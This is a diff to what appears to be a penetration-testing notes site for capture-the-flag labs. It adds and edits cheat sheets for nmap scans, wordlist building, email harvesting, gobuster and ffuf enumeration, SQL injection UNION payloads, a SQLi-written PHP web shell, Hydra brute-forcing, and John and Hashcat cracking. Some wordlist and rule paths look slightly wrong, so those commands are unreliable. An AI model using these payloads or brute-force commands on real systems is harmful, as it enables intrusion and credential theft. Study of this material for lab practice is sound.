@@ -82,6 +82,8 @@ UDP ping: expects ICMP port unreachable packet if host is up and closed port : <
 
 ## Port scans
 
+<span class="cmd">nmap -p- -T4 -sV -sC -oN nmap [MACHINE_IP]</span>
+
 | Flag | Desc |  
 | --- | --- |  
 | -sT | TCP scan |  
@@ -145,10 +147,9 @@ Window scan <span class="cmd">-sW</span> : checks window field of rst packet, so
             body: `## Directory and Files
 
 <span class="cmd">/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</span>  
-<span class="cmd">/usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt</span>
-
-<span class="cmd">/usr/share/wordlists/dirbuster/directory-list-2.3-*.txt</span>  
-<span class="cmd">/usr/share/wordlists/dirbuster/directory-list-1.0.txt</span>  
+<span class="cmd">/usr/share/wordlists/seclists/Discovery/Web-Content/medium.txt</span>  
+<span class="cmd">/usr/share/wordlists/dirb/medium.txt</span>  
+<span class="cmd">/usr/share/wordlists/dirb/directory-list-1.0.txt</span>  
 <span class="cmd">/usr/share/wordlists/dirb/big.txt</span>  
 <span class="cmd">/usr/share/wordlists/dirb/common.txt</span>
 
@@ -160,7 +161,8 @@ Window scan <span class="cmd">-sW</span> : checks window field of rst packet, so
 
 ## Subdomains
 
-<span class="cmd">/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span>
+<span class="cmd">/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span>  
+<span class="cmd">/usr/share/wordlists/seclists/Discovery/DNS/namelist.txt</span>
 
 ## Default web root directories
 
@@ -171,6 +173,71 @@ Window scan <span class="cmd">-sW</span> : checks window field of rst packet, so
 ### Windows
 
 <span class="cmd">/usr/share/seclists/Discovery/Web-Content/default-web-root-directory-windows.txt</span>`,
+            children: [
+              {
+                slug: "gathering-info",
+                title: "Gathering info",
+                body: `# Gathering information for custom wordlists
+
+## CeWL: Words and emails
+
+<span class="cmd">cewl -d [number] -m [number] --lowercase --with-numbers -e --email_file [file] -w [file] http://[MACHINE_IP]</span>
+
+| Flag | Description |  
+| --- | --- |  
+| -d [number] | Spider [number] levels deep |  
+| -m [number] | Only include words with [number] or more characters |  
+| --lowercase | Convert all extracted words to lowercase |  
+| --with-numbers | Include words that contain numbers |  
+| -e | Enable email extraction |  
+| --email_file [file] | Save found emails |  
+| -w [file] | Save extracted words |
+
+## Download documents
+
+<span class="cmd">wget -r -A pdf http://[MACHINE_IP]/[folder]/</span>
+
+## Extract strings
+
+Extract strings from the above downloaded docs  
+<span class="cmd">for f in $(find [folder_with_files] -name '*.pdf'); do strings -n 5 "$f" | grep -vP '^[/<>%0-9\\\\]|^(stream|endstream|endobj|xref|trailer|startxref)$' >> raw_words.txt; done</span>
+
+## Extract Emails from pdfs
+
+Extract emails from above downloaded docs  
+<span class="cmd">grep -RhiaoP '[A-Za-z0-9._%+-]+@[domain]\\.com' [folder_with_files] > emails_docs.txt</span>  
+<span class="cmd">sort -u emails_docs.txt > emails_docs.unique.txt</span>  
+<span class="cmd">grep -Po '^[^@]+' emails_docs.unique.txt > users_from_emails.txt</span>
+
+# Gathering more users
+
+• Look at the page  
+• Try to extract from the HTML using grep  
+• When you have a file with first and last names:  
+first.last:   
+<span class="cmd">awk '{print tolower($1)"."tolower($2)}' names.txt > users_first.last.txt</span>  
+first initial + last:   
+<span class="cmd">awk '{print tolower(substr($1,1,1))tolower($2)}' names.txt > users_flast.txt</span>  
+first + last initial:   
+<span class="cmd">awk '{print tolower($1)tolower(substr($2,1,1))}' names.txt > users_firstl.txt</span>`,
+              },
+              {
+                slug: "cleaning-wordlists",
+                title: "Cleaning wordlists",
+                body: `# Merging and Normalising
+
+## Merge multiple files into one
+
+<span class="cmd">cat [file1] [file2] | sort -u > [combined]</span>
+
+## Normalise filter
+
+<span class="cmd">cat [combined] | tr '[:upper:]' '[:lower:]' | tr -d '\\r' | grep -P '^[a-z0-9][a-z0-9._-]{4,}$' | sort -u > [combined_clean]</span>  
+Converts uppercase to lowercase  
+Strips windows carriage returns  
+Removes noise strings, only: that start with an alphanumeric character, then allow letters, digits, dots, underscores or dashes, and are at least five characters long.`,
+              },
+            ],
           },
           {
             slug: "tools",
@@ -191,7 +258,7 @@ cURL`,
 ## Directory and File Enumeration
 
 dir mode  
-<span class="cmd">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php, txt, html, js -u http://[MACHINE_IP] </span>
+<span class="cmd">gobuster dir -w /usr/share/wordlists/dirb/medium.txt -x php, txt, html, js -u http://[MACHINE_IP] </span>
 
 | Flag | Description | Example |  
 | --- | --- | --- |  
@@ -243,7 +310,7 @@ else: <span class="cmd">-u</span> can have the domain name directly, rather than
                 title: "ffuf",
                 body: `## Directory Enumeration
 
-<span class="cmd">ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://[MACHINE_IP]</span>
+<span class="cmd">ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/medium.txt -u http://[MACHINE_IP]</span>
 
 | Flag | Description |  
 | --- | --- |  
@@ -272,11 +339,11 @@ Add FUZZ in the URL itself (escape <span class="cmd">&</span> with <span class="
 
 ## Subdomain Enumeration
 
-<span class="cmd">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.[domain]" -u http://[MACHINE_IP]</span>  
+<span class="cmd">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.[domain]" -u http://[MACHINE_IP]</span>  
 use ip address, sometimes the name wont work even after adding it to <span class="cmd">/etc/hosts</span>
 
 Filter by size of response:  
-<span class="cmd">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt  -fs {size} -H "Host: FUZZ.[domain]" -u http://[MACHINE_IP]</span>`,
+<span class="cmd">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt  -fs {size} -H "Host: FUZZ.[domain]" -u http://[MACHINE_IP]</span>`,
               },
               {
                 slug: "curl",
@@ -377,10 +444,10 @@ js compiler: [https://jsconsole.com/](https://jsconsole.com/)`,
 
 ## Directories and file enumeration
 
-<span class="cmd">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x html,txt,php, js -u http://[MACHINE_IP]</span>  
-<span class="cmd">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php, txt, html, js -u http://[MACHINE_IP]</span>
+<span class="cmd">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/medium.txt -x html,txt,php, js -u http://[MACHINE_IP]</span>  
+<span class="cmd">gobuster dir -w /usr/share/wordlists/dirb/medium.txt -x php, txt, html, js -u http://[MACHINE_IP]</span>
 
-<span class="cmd">ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://[MACHINE_IP] -e .html,.txt.,php,.js</span>
+<span class="cmd">ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/medium.txt -u http://[MACHINE_IP] -e .html,.txt.,php,.js</span>
 
 ## Subdomain Enumeration
 
@@ -390,11 +457,11 @@ gobuster:
 <span class="cmd">gobuster dns --domain [example.thm] -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</span>
 
 ffuf:  
-<span class="cmd">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://[MACHINE_IP]</span>  
+<span class="cmd">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://[MACHINE_IP]</span>  
 <span class="cmd">use ip address, sometimes the name wont work even after adding it to /etc/hosts</span>
 
 Filter by size of response:  
-<span class="cmd">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt  -fs {size} -H "Host: FUZZ.[MACHINE_IP]" -u http://[MACHINE_IP]</span>
+<span class="cmd">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt  -fs {size} -H "Host: FUZZ.[MACHINE_IP]" -u http://[MACHINE_IP]</span>
 
 ## Virtual Host Enumeration
 
@@ -701,7 +768,7 @@ The **COLUMNS** table in the **INFORMATION_SCHEMA** Database contains informatio
 
 • First, find out no. columns and the datatype of it.  
 • Then find out the name of the table and columns.  
-**If 4 columns** are present and **you can** retrieve data **from 2** columns, **then put null for the other columns**  
+**If 4 columns **are present and **you can **retrieve data **from 2 **columns, **then put null for the other columns**  
 Eg: <span class="cmd">' UNION SELECT NULL, username, password, NULL FROM users--</span>
 
 ## Retrieving multiple values in single column
@@ -709,7 +776,7 @@ Eg: <span class="cmd">' UNION SELECT NULL, username, password, NULL FROM users--
 Conatenation: Refer cheatsheet for syntax  
 If only 1 column accepts strings, concatenate both fields with a delimiter  
 For eg:   
-	<span class="cmd">' UNION SELECT null, username || '\\~' || password FROM users--</span>  
+	<span class="cmd">' UNION SELECT null, username || '~' || password FROM users--</span>  
 Use delimiter like '~' or '@' in the middle to make out the different fields
 
 # Reading Files
@@ -778,7 +845,7 @@ Write through SQLi:
 <span class="cmd">select '<?php system($_REQUEST[0]); ?>' into outfile '/var/www/html/shell.php'</span>  
 To execute commands: <span class="cmd">/filename.php?0=[command]</span>
 
-NOTE: all the placeholders/columns must be satisfied. for columns use open, close quotes ""`,
+NOTE: all the placeholders/columns must be satisfied. for columns use open,close quotes ""`,
                 children: [
                   {
                     slug: "sqlmap",
@@ -973,14 +1040,35 @@ Links:
           {
             slug: "password-cracking",
             title: "Password Cracking",
-            body: `Cracking passwords using:  
-Hydra  
-JohnTheRipper`,
+            body: `# Prefix of different hashes
+
+| Prefix | Algorithm |  
+| --- | --- |  
+| y | yescrypt is a scalable hashing scheme and is the default and recommended choice in new systems |  
+| gy | gost-yescrypt uses the GOST R 34.11-2012 hash function and the yescrypt hashing method |  
+| 7 | scrypt is a password-based key derivation function |  
+| $2b$, $2y$, $2a$, $2x$ | bcrypt is a hash based on the Blowfish block cipher originally developed for OpenBSD but supported on a recent version of FreeBSD, NetBSD, Solaris 10 and newer, and several Linux distributions |  
+| 6 | sha512crypt is a hash based on SHA-2 with 512-bit output originally developed for GNU libc and commonly used on (older) Linux systems |  
+| $md5 | SunMD5 is a hash based on the MD5 algorithm originally developed for Solaris |  
+| 1 | md5crypt is a hash based on the MD5 algorithm originally developed for FreeBSD |
+
+# Identifying hashes
+
+<span class="cmd">hashid -m [hash]</span>  
+<span class="cmd">-m</span> : gives hashcat mode.  
+<span class="cmd">-j</span> : gives john format name.
+
+<span class="cmd">nth -t [hash]</span>  
+<span class="cmd">ntf -f [file_of_hashes]</span>`,
             children: [
               {
                 slug: "hydra",
                 title: "Hydra",
-                body: `# Options
+                body: `## Basic Syntax
+
+<span class="cmd">hydra -l [username] -P [password_file] [MACHINE_IP] [protocol]</span>
+
+# Options
 
 | Option | Description |  
 | --- | --- |  
@@ -997,12 +1085,14 @@ JohnTheRipper`,
 
 ## FTP Bruteforce
 
-<span class="cmd">hydra -l [username] -P [password_file] [MACHINE_IP]</span>
+<span class="cmd">hydra -l [username] -P [password_file] [MACHINE_IP] ftp</span>
 
 ## HTTP POST Form Bruteforce
 
-<span class="cmd">hydra -l [username] -P [password_file] [MACHINE_IP] http-post-form "/:username=^USER^&password=^PASS^:F=[message_to_check_against]" -V</span>  
-F= whatever is present here will be checked. If the response contains this, it's considered a valid match.`,
+<span class="cmd">hydra -l [username] -P [password_file] [MACHINE_IP] http-post-form "[path_to_login_page]]/:username=^USER^&password=^PASS^:[F/S]=[message_to_check]" -V</span>  
+<span class="cmd">F=</span> Failure condition - String that appears when login has failed.  
+<span class="cmd">S=</span> Success condtion - Use if output on successful login is known.  
+Eg: <span class="cmd">hydra -L tryfinanceme.local/users.txt -P pass_helios.txt </span><span class="cmd">**tryfinanceme.local**</span><span class="cmd"> http-post-form "</span><span class="cmd">**/helios/login.php**</span><span class="cmd">:username=^USER^&password=^PASS^:</span><span class="cmd">**F=**</span><span class="cmd">Invalid credentials"</span>`,
               },
               {
                 slug: "johntheripper",
@@ -1012,9 +1102,17 @@ F= whatever is present here will be checked. If the response contains this, it's
 <span class="cmd">john --format=[format] --wordlist=[path to wordlist] [path to file]</span>  
 This is if the file is not converted to hash beforehand
 
-## List formats
+## Options
 
-<span class="cmd">john --list=formats</span>  
+| Option | Description |  
+| --- | --- |  
+| --format=[format] | Hash format |  
+| --wordlist=[wordlist] | Path to wordlist |  
+| --list=formats | List all formats |  
+| --rules= | Apply rules file |
+
+### Filter formats
+
 <span class="cmd">john --list=formats | grep -iF "format"</span>
 
 ## /etc/shadow hashes
@@ -1037,7 +1135,52 @@ This is if the file is not converted to hash beforehand
 ## Rar files
 
 <span class="cmd">rar2john [rar file] > [output file]</span>  
-<span class="cmd">john --wordlist=[path to wordlist] [output file]</span>`,
+<span class="cmd">john --wordlist=[path to wordlist] [output file]</span>
+
+## Rule based attack
+
+<span class="cmd">john --format=[format] --wordlist=[path to wordlist] --rules=/usr/share/john/rules/best64.rule [path to file]</span>`,
+              },
+              {
+                slug: "hashcat",
+                title: "Hashcat",
+                body: `## Basic Syntax
+
+<span class="cmd">hashcat -m [hash mode] -a 0 [hash_file] /usr/share/wordlists/rockyou.txt</span>  
+-m: use hashid -m to get hashcat hash mode   
+-a: Attack mode - 0=dictionary (default)
+
+## Options
+
+**Hashcat**
+
+| Option | Description |  
+| --- | --- |  
+| -m [type] | Hash mode |  
+| -a [mode] | Attack mode. 0: dictionary, 3: mask |  
+| -r [rule_file] | Rules file |  
+| --show | Show cracked hashes |  
+| -o [output_file] | Save output |
+
+## Rule based attack
+
+<span class="cmd">hashcat -m [hash type] -a 0 [hash file] /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule</span>
+
+# Placeholders
+
+| Placeholder | Character Set |  
+| --- | --- |  
+| ?l | Lowercase letters (a-z) |  
+| ?u | Uppercase letters (A-Z) |  
+| ?d | Digits (0-9) |  
+| ?s | Special characters |  
+| ?a | All printable ASCII |
+
+Eg: <span class="cmd">Summer2026!</span> would be <span class="cmd">?u?l?l?l?l?l?d?d?d?d?s</span>
+
+## Mask attack
+
+<span class="cmd">hashcat -m 0 -a 3 [hash file] '?l?l?l?l?l?l?l?l'</span>`,
               },
             ],
           },
